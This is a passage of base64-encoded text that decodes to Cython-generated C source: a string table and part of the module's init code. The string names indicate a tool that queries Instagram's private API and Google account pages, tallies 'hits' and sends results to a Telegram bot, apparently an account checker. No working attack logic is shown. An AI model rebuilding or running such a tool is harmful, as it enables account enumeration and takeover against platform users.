jb21fUmVzZXRfRW1haWwsIHNpemVvZihfX3B5eF9rX2dtYWlsX2NvbV9SZXNldF9FbWFpbCksIDAsIDEsIDB9LCAKICB7X19weXhfa19nb29kaWcsIHNpemVvZihfX3B5eF9rX2dvb2RpZyksIDAsIDEsIDF9LCAKICB7X19weXhfa19nb29nbGVfYWNjb3VudHNfeHNyZiwgc2l6ZW9mKF9fcHl4X2tfZ29vZ2xlX2FjY291bnRzX3hzcmYpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfZ3JvdXAsIHNpemVvZihfX3B5eF9rX2dyb3VwKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2d1aWQsIHNpemVvZihfX3B5eF9rX2d1aWQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfZ3ppcF9kZWZsYXRlLCBzaXplb2YoX19weXhfa19nemlwX2RlZmxhdGUpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfaGFzaGxpYiwgc2l6ZW9mKF9fcHl4X2tfaGFzaGxpYiksIDAsIDEsIDF9LCAKICB7X19weXhfa19oZTMsIHNpemVvZihfX3B5eF9rX2hlMyksIDAsIDEsIDF9LCAKICB7X19weXhfa19oZWFkZXJzLCBzaXplb2YoX19weXhfa19oZWFkZXJzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2hleGRpZ2VzdCwgc2l6ZW9mKF9fcHl4X2tfaGV4ZGlnZXN0KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2hpdHMsIHNpemVvZihfX3B5eF9rX2hpdHMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfaG9zdCwgc2l6ZW9mKF9fcHl4X2tfaG9zdCksIDAsIDEsIDF9LCAKICB7X19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tLCBzaXplb2YoX19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fX19zaWduLCBzaXplb2YoX19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX19fc2lnbiksIDAsIDEsIDB9LCAKICB7X19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX19fc2lnbl8yLCBzaXplb2YoX19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX19fc2lnbl8yKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fc2lnbmluLCBzaXplb2YoX19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ25pbiksIDAsIDEsIDB9LCAKICB7X19weXhfa19odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ251cCwgc2l6ZW9mKF9fcHl4X2tfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9zaWdudXApLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9zaWdudXBfMiwgc2l6ZW9mKF9fcHl4X2tfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9zaWdudXBfMiksIDAsIDEsIDB9LCAKICB7X19weXhfa19odHRwc19hcGlfdGVsZWdyYW1fb3JnX2JvdCwgc2l6ZW9mKF9fcHl4X2tfaHR0cHNfYXBpX3RlbGVncmFtX29yZ19ib3QpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfaHR0cHNfaV9pbnN0YWdyYW1fY29tX2FwaV92MV9hY2MsIHNpemVvZihfX3B5eF9rX2h0dHBzX2lfaW5zdGFncmFtX2NvbV9hcGlfdjFfYWNjKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX2h0dHBzX3d3d19pbnN0YWdyYW1fY29tLCBzaXplb2YoX19weXhfa19odHRwc193d3dfaW5zdGFncmFtX2NvbSksIDAsIDEsIDB9LCAKICB7X19weXhfa19odHRwc193d3dfaW5zdGFncmFtX2NvbV9hcGlfZ3JhcCwgc2l6ZW9mKF9fcHl4X2tfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb21fYXBpX2dyYXApLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb21fY3Jpc3RpYW4sIHNpemVvZihfX3B5eF9rX2h0dHBzX3d3d19pbnN0YWdyYW1fY29tX2NyaXN0aWFuKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX2ksIHNpemVvZihfX3B5eF9rX2kpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfaV9pbnN0YWdyYW1fY29tLCBzaXplb2YoX19weXhfa19pX2luc3RhZ3JhbV9jb20pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfaWRzLCBzaXplb2YoX19weXhfa19pZHMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfaWdfc2lnX2tleV92ZXJzaW9uLCBzaXplb2YoX19weXhfa19pZ19zaWdfa2V5X3ZlcnNpb24pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfaW1wb3J0bGliLCBzaXplb2YoX19weXhfa19pbXBvcnRsaWIpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfaW1wb3J0bGliX3V0aWwsIHNpemVvZihfX3B5eF9rX2ltcG9ydGxpYl91dGlsKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2luZm9pbnN0YSwgc2l6ZW9mKF9fcHl4X2tfaW5mb2luc3RhKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2luaXRpYWxpemluZywgc2l6ZW9mKF9fcHl4X2tfaW5pdGlhbGl6aW5nKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2lucHV0LCBzaXplb2YoX19weXhfa19pbnB1dCksIDAsIDEsIDF9LCAKICB7X19weXhfa19pc1ByYWlzZSwgc2l6ZW9mKF9fcHl4X2tfaXNQcmFpc2UpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfaXNfYnVzaW5lc3MsIHNpemVvZihfX3B5eF9rX2lzX2J1c2luZXNzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2lzX2Nvcm91dGluZSwgc2l6ZW9mKF9fcHl4X2tfaXNfY29yb3V0aW5lKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2lzX3ByaXZhdGUsIHNpemVvZihfX3B5eF9rX2lzX3ByaXZhdGUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfaXNfdmVyaWZpZWQsIHNpemVvZihfX3B5eF9rX2lzX3ZlcmlmaWVkKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2lzZW5hYmxlZCwgc2l6ZW9mKF9fcHl4X2tfaXNlbmFibGVkKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX2pvaW4sIHNpemVvZihfX3B5eF9rX2pvaW4pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfanNvbiwgc2l6ZW9mKF9fcHl4X2tfanNvbiksIDAsIDEsIDF9LCAKICB7X19weXhfa19rLCBzaXplb2YoX19weXhfa19rKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2tlZXBfYWxpdmUsIHNpemVvZihfX3B5eF9rX2tlZXBfYWxpdmUpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfbG9nbywgc2l6ZW9mKF9fcHl4X2tfbG9nbyksIDAsIDEsIDF9LCAKICB7X19weXhfa19sc2QsIHNpemVvZihfX3B5eF9rX2xzZCksIDAsIDEsIDF9LCAKICB7X19weXhfa19tLCBzaXplb2YoX19weXhfa19tKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX21fbmVfcHksIHNpemVvZihfX3B5eF9rX21fbmVfcHkpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfbWFpbiwgc2l6ZW9mKF9fcHl4X2tfbWFpbiksIDAsIDEsIDF9LCAKICB7X19weXhfa19tZDUsIHNpemVvZihfX3B5eF9rX21kNSksIDAsIDEsIDF9LCAKICB7X19weXhfa19tZWRpYV9jb3VudCwgc2l6ZW9mKF9fcHl4X2tfbWVkaWFfY291bnQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfbWV0YSwgc2l6ZW9mKF9fcHl4X2tfbWV0YSksIDAsIDEsIDF9LCAKICB7X19weXhfa19taWRfWlZmR3ZnQUJBQUdvUXFhN0FZM21nb1lCVjFuUCwgc2l6ZW9mKF9fcHl4X2tfbWlkX1pWZkd2Z0FCQUFHb1FxYTdBWTNtZ29ZQlYxblApLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfbW9kdWxlLCBzaXplb2YoX19weXhfa19tb2R1bGUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfbjEsIHNpemVvZihfX3B5eF9rX24xKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX24yLCBzaXplb2YoX19weXhfa19uMiksIDAsIDEsIDF9LCAKICB7X19weXhfa19uYW1lLCBzaXplb2YoX19weXhfa19uYW1lKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX25hbWVfMiwgc2l6ZW9mKF9fcHl4X2tfbmFtZV8yKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX25lLCBzaXplb2YoX19weXhfa19uZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19uZXh0LCBzaXplb2YoX19weXhfa19uZXh0KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX25vX1JFU1QsIHNpemVvZihfX3B5eF9rX25vX1JFU1QpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfbnQsIHNpemVvZihfX3B5eF9rX250KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX251bGwsIHNpemVvZihfX3B5eF9rX251bGwpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfbnVsbF9udWxsX251bGxfbnVsbF9udWxsX05MX251bCwgc2l6ZW9mKF9fcHl4X2tfbnVsbF9udWxsX251bGxfbnVsbF9udWxsX05MX251bCksIDAsIDEsIDB9LCAKICB7X19weXhfa19vLCBzaXplb2YoX19weXhfa19vKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX29rLCBzaXplb2YoX19weXhfa19vayksIDAsIDEsIDF9LCAKICB7X19weXhfa19vcGVuLCBzaXplb2YoX19weXhfa19vcGVuKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX29yaWdpbiwgc2l6ZW9mKF9fcHl4X2tfb3JpZ2luKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX29zLCBzaXplb2YoX19weXhfa19vcyksIDAsIDEsIDF9LCAKICB7X19weXhfa19vdXRwdXQsIHNpemVvZihfX3B5eF9rX291dHB1dCksIDAsIDEsIDF9LCAKICB7X19weXhfa19vdywgc2l6ZW9mKF9fcHl4X2tfb3cpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcGFyYW1zLCBzaXplb2YoX19weXhfa19wYXJhbXMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcGlwX2luc3RhbGxfYnM0LCBzaXplb2YoX19weXhfa19waXBfaW5zdGFsbF9iczQpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfcGlwX2luc3RhbGxfY29sb3JhbWEsIHNpemVvZihfX3B5eF9rX3BpcF9pbnN0YWxsX2NvbG9yYW1hKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3BpcF9pbnN0YWxsX2hhc2hsaWIsIHNpemVvZihfX3B5eF9rX3BpcF9pbnN0YWxsX2hhc2hsaWIpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfcGlwX2luc3RhbGxfanNvbiwgc2l6ZW9mKF9fcHl4X2tfcGlwX2luc3RhbGxfanNvbiksIDAsIDEsIDB9LCAKICB7X19weXhfa19waXBfaW5zdGFsbF9weXRob25fY2ZvbnRzLCBzaXplb2YoX19weXhfa19waXBfaW5zdGFsbF9weXRob25fY2ZvbnRzKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3BpcF9pbnN0YWxsX3JhbmRvbSwgc2l6ZW9mKF9fcHl4X2tfcGlwX2luc3RhbGxfcmFuZG9tKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3BpcF9pbnN0YWxsX3JlLCBzaXplb2YoX19weXhfa19waXBfaW5zdGFsbF9yZSksIDAsIDEsIDB9LCAKICB7X19weXhfa19waXBfaW5zdGFsbF9yZXF1ZXN0cywgc2l6ZW9mKF9fcHl4X2tfcGlwX2luc3RhbGxfcmVxdWVzdHMpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfcGlwX2luc3RhbGxfcmljaCwgc2l6ZW9mKF9fcHl4X2tfcGlwX2luc3RhbGxfcmljaCksIDAsIDEsIDB9LCAKICB7X19weXhfa19waXBfaW5zdGFsbF90aHJlYWRpbmcsIHNpemVvZihfX3B5eF9rX3BpcF9pbnN0YWxsX3RocmVhZGluZyksIDAsIDEsIDB9LCAKICB7X19weXhfa19waXBfaW5zdGFsbF90aW1lLCBzaXplb2YoX19weXhfa19waXBfaW5zdGFsbF90aW1lKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3BpcF9pbnN0YWxsX3VzZXJfYWdlbnQsIHNpemVvZihfX3B5eF9rX3BpcF9pbnN0YWxsX3VzZXJfYWdlbnQpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfcGlwX2luc3RhbGxfdXVpZCwgc2l6ZW9mKF9fcHl4X2tfcGlwX2luc3RhbGxfdXVpZCksIDAsIDEsIDB9LCAKICB7X19weXhfa19waywgc2l6ZW9mKF9fcHl4X2tfcGspLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcG9wLCBzaXplb2YoX19weXhfa19wb3ApLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcG9zdCwgc2l6ZW9mKF9fcHl4X2tfcG9zdCksIDAsIDEsIDF9LCAKICB7X19weXhfa19wcCwgc2l6ZW9mKF9fcHl4X2tfcHApLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcHBwcCwgc2l6ZW9mKF9fcHl4X2tfcHBwcCksIDAsIDEsIDF9LCAKICB7X19weXhfa19wcmludCwgc2l6ZW9mKF9fcHl4X2tfcHJpbnQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcHJpbnRpbmcsIHNpemVvZihfX3B5eF9rX3ByaW50aW5nKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3ByaW9yaXR5LCBzaXplb2YoX19weXhfa19wcmlvcml0eSksIDAsIDEsIDF9LCAKICB7X19weXhfa19xY29tX2VuX1VTXzU0NTk4Niwgc2l6ZW9mKF9fcHl4X2tfcWNvbV9lbl9VU181NDU5ODYpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfcXVhbG5hbWUsIHNpemVvZihfX3B5eF9rX3F1YWxuYW1lKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3F1ZXJ5LCBzaXplb2YoX19weXhfa19xdWVyeSksIDAsIDEsIDF9LCAKICB7X19weXhfa19yLCBzaXplb2YoX19weXhfa19yKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JhbmRfaWRzLCBzaXplb2YoX19weXhfa19yYW5kX2lkcyksIDAsIDEsIDF9LCAKICB7X19weXhfa19yYW5kaW50LCBzaXplb2YoX19weXhfa19yYW5kaW50KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JhbmRvbSwgc2l6ZW9mKF9fcHl4X2tfcmFuZG9tKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JhbmRyYW5nZSwgc2l6ZW9mKF9fcHl4X2tfcmFuZHJhbmdlKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JhbmdlLCBzaXplb2YoX19weXhfa19yYW5nZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19yZSwgc2l6ZW9mKF9fcHl4X2tfcmUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcmVhZCwgc2l6ZW9mKF9fcHl4X2tfcmVhZCksIDAsIDEsIDF9LCAKICB7X19weXhfa19yZWZlcmVyLCBzaXplb2YoX19weXhfa19yZWZlcmVyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JlbmRlciwgc2l6ZW9mKF9fcHl4X2tfcmVuZGVyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JlcXVlc3RzLCBzaXplb2YoX19weXhfa19yZXF1ZXN0cyksIDAsIDEsIDF9LCAKICB7X19weXhfa19yZXMxLCBzaXplb2YoX19weXhfa19yZXMxKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3Jlc3BvbnNlLCBzaXplb2YoX19weXhfa19yZXNwb25zZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19yZXN0LCBzaXplb2YoX19weXhfa19yZXN0KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JpY2hfY29uc29sZSwgc2l6ZW9mKF9fcHl4X2tfcmljaF9jb25zb2xlKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JpY2hfcGFuZWwsIHNpemVvZihfX3B5eF9rX3JpY2hfcGFuZWwpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcm5kLCBzaXplb2YoX19weXhfa19ybmQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcnIsIHNpemVvZihfX3B5eF9rX3JyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NlYXJjaCwgc2l6ZW9mKF9fcHl4X2tfc2VhcmNoKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NlbmQsIHNpemVvZihfX3B5eF9rX3NlbmQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc2VuZE1lc3NhZ2VfY2hhdF9pZCwgc2l6ZW9mKF9fcHl4X2tfc2VuZE1lc3NhZ2VfY2hhdF9pZCksIDAsIDEsIDB9LCAKICB7X19weXhfa19zZXJ2ZXJfdGltZXN0YW1wcywgc2l6ZW9mKF9fcHl4X2tfc2VydmVyX3RpbWVzdGFtcHMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc2V0X25hbWUsIHNpemVvZihfX3B5eF9rX3NldF9uYW1lKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NpZ25lZF9ib2R5LCBzaXplb2YoX19weXhfa19zaWduZWRfYm9keSksIDAsIDEsIDF9LCAKICB7X19weXhfa19zbGVlcCwgc2l6ZW9mKF9fcHl4X2tfc2xlZXApLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc3BhY2UsIHNpemVvZihfX3B5eF9rX3NwYWNlKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NwZWMsIHNpemVvZihfX3B5eF9rX3NwZWMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc3BsaXQsIHNpemVvZihfX3B5eF9rX3NwbGl0KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NwbGl0bGluZXMsIHNpemVvZihfX3B5eF9rX3NwbGl0bGluZXMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc3MsIHNpemVvZihfX3B5eF9rX3NzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3N0YXJ0LCBzaXplb2YoX19weXhfa19zdGFydCksIDAsIDEsIDF9LCAKICB7X19weXhfa19zdGRvdXQsIHNpemVvZihfX3B5eF9rX3N0ZG91dCksIDAsIDEsIDF9LCAKICB7X19weXhfa19zdWJwcm9jZXNzLCBzaXplb2YoX19weXhfa19zdWJwcm9jZXNzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3N5cywgc2l6ZW9mKF9fcHl4X2tfc3lzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3N5c3RlbSwgc2l6ZW9mKF9fcHl4X2tfc3lzdGVtKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3QsIHNpemVvZihfX3B5eF9rX3QpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdGFyZ2V0LCBzaXplb2YoX19weXhfa190YXJnZXQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdGVzdCwgc2l6ZW9mKF9fcHl4X2tfdGVzdCksIDAsIDEsIDF9LCAKICB7X19weXhfa190ZXh0LCBzaXplb2YoX19weXhfa190ZXh0KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3RleHRfMiwgc2l6ZW9mKF9fcHl4X2tfdGV4dF8yKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3RocmVhZGluZywgc2l6ZW9mKF9fcHl4X2tfdGhyZWFkaW5nKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3RocmVhZHMsIHNpemVvZihfX3B5eF9rX3RocmVhZHMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdGhyb3csIHNpemVvZihfX3B5eF9rX3Rocm93KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3RpbWUsIHNpemVvZihfX3B5eF9rX3RpbWUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdGwsIHNpemVvZihfX3B5eF9rX3RsKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3RsX3R4dCwgc2l6ZW9mKF9fcHl4X2tfdGxfdHh0KSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3RsbCwgc2l6ZW9mKF9fcHl4X2tfdGxsKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3RsbF9sb2NhbHNfZ2VuZXhwciwgc2l6ZW9mKF9fcHl4X2tfdGxsX2xvY2Fsc19nZW5leHByKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3Rvaywgc2l6ZW9mKF9fcHl4X2tfdG9rKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3RvdGFsLCBzaXplb2YoX19weXhfa190b3RhbCksIDAsIDEsIDF9LCAKICB7X19weXhfa190cnVlLCBzaXplb2YoX19weXhfa190cnVlKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3VfMV9pLCBzaXplb2YoX19weXhfa191XzFfaSksIDAsIDEsIDB9LCAKICB7X19weXhfa191YSwgc2l6ZW9mKF9fcHl4X2tfdWEpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdWlkLCBzaXplb2YoX19weXhfa191aWQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdXNlciwgc2l6ZW9mKF9fcHl4X2tfdXNlciksIDAsIDEsIDF9LCAKICB7X19weXhfa191c2VySUQsIHNpemVvZihfX3B5eF9rX3VzZXJJRCksIDAsIDEsIDB9LCAKICB7X19weXhfa191c2VyX2FnZW50LCBzaXplb2YoX19weXhfa191c2VyX2FnZW50KSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3VzZXJfYWdlbnRfMiwgc2l6ZW9mKF9fcHl4X2tfdXNlcl9hZ2VudF8yKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3VzZXJuYW1lLCBzaXplb2YoX19weXhfa191c2VybmFtZSksIDAsIDEsIDF9LCAKICB7X19weXhfa191c2VybmFtZV9jcmlzdGlhbm8sIHNpemVvZihfX3B5eF9rX3VzZXJuYW1lX2NyaXN0aWFubyksIDAsIDEsIDB9LCAKICB7X19weXhfa191dGZfOCwgc2l6ZW9mKF9fcHl4X2tfdXRmXzgpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfdXRpbCwgc2l6ZW9mKF9fcHl4X2tfdXRpbCksIDAsIDEsIDF9LCAKICB7X19weXhfa191dWksIHNpemVvZihfX3B5eF9rX3V1aSksIDAsIDEsIDF9LCAKICB7X19weXhfa191dWlkLCBzaXplb2YoX19weXhfa191dWlkKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3V1aWQ0LCBzaXplb2YoX19weXhfa191dWlkNCksIDAsIDEsIDF9LCAKICB7X19weXhfa191dXUsIHNpemVvZihfX3B5eF9rX3V1dSksIDAsIDEsIDF9LCAKICB7X19weXhfa191dXVfbG9jYWxzX2dlbmV4cHIsIHNpemVvZihfX3B5eF9rX3V1dV9sb2NhbHNfZ2VuZXhwciksIDAsIDEsIDF9LCAKICB7X19weXhfa192YWx1ZSwgc2l6ZW9mKF9fcHl4X2tfdmFsdWUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdmFyaWFibGVzLCBzaXplb2YoX19weXhfa192YXJpYWJsZXMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdywgc2l6ZW9mKF9fcHl4X2tfdyksIDAsIDEsIDF9LCAKICB7X19weXhfa193ZWJicm93c2VyLCBzaXplb2YoX19weXhfa193ZWJicm93c2VyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3dyaXRlLCBzaXplb2YoX19weXhfa193cml0ZSksIDAsIDEsIDF9LCAKICB7X19weXhfa194LCBzaXplb2YoX19weXhfa194KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3hfZmJfZnJpZW5kbHlfbmFtZSwgc2l6ZW9mKF9fcHl4X2tfeF9mYl9mcmllbmRseV9uYW1lKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3hfZmJfbHNkLCBzaXplb2YoX19weXhfa194X2ZiX2xzZCksIDAsIDEsIDB9LCAKICB7X19weXhfa195ZWxsb3csIHNpemVvZihfX3B5eF9rX3llbGxvdyksIDAsIDEsIDF9LCAKICB7X19weXhfa195eSwgc2l6ZW9mKF9fcHl4X2tfeXkpLCAwLCAxLCAxfSwgCiAgezAsIDAsIDAsIDAsIDB9Cn07CgpzdGF0aWMgaW50IF9fUHl4X0luaXRTdHJpbmdzKF9fUHl4X1N0cmluZ1RhYkVudHJ5IGNvbnN0ICp0LCBQeU9iamVjdCAqKnRhcmdldCwgY29uc3QgY2hhciogY29uc3QqIGVuY29kaW5nX25hbWVzKTsKCgoKc3RhdGljIGludCBfX1B5eF9Jbml0Q2FjaGVkQnVpbHRpbnMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7CiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTsKICBfX3B5eF9idWlsdGluX3ByaW50ID0gX19QeXhfR2V0QnVpbHRpbk5hbWUoX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcHJpbnQpOyBpZiAoIV9fcHl4X2J1aWx0aW5fcHJpbnQpIF9fUFlYX0VSUigwLCA3MywgX19weXhfTDFfZXJyb3IpCiAgX19weXhfYnVpbHRpbl9pbnB1dCA9IF9fUHl4X0dldEJ1aWx0aW5OYW1lKF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2lucHV0KTsgaWYgKCFfX3B5eF9idWlsdGluX2lucHV0KSBfX1BZWF9FUlIoMCwgODgsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X2J1aWx0aW5fb3BlbiA9IF9fUHl4X0dldEJ1aWx0aW5OYW1lKF9fcHl4X21zdGF0ZS0+X19weXhfbl91X29wZW4pOyBpZiAoIV9fcHl4X2J1aWx0aW5fb3BlbikgX19QWVhfRVJSKDAsIDE1NCwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfYnVpbHRpbl9yYW5nZSA9IF9fUHl4X0dldEJ1aWx0aW5OYW1lKF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3JhbmdlKTsgaWYgKCFfX3B5eF9idWlsdGluX3JhbmdlKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcikKICByZXR1cm4gMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgcmV0dXJuIC0xOwp9CgoKc3RhdGljIGludCBfX1B5eF9Jbml0Q2FjaGVkQ29uc3RhbnRzKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkgewogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19QeXhfSW5pdENhY2hlZENvbnN0YW50cyIsIDApOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwOCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMF0pKSBfX1BZWF9FUlIoMCwgOTUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzFdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfOSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMV0pKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMV0pOwogIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMV0pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9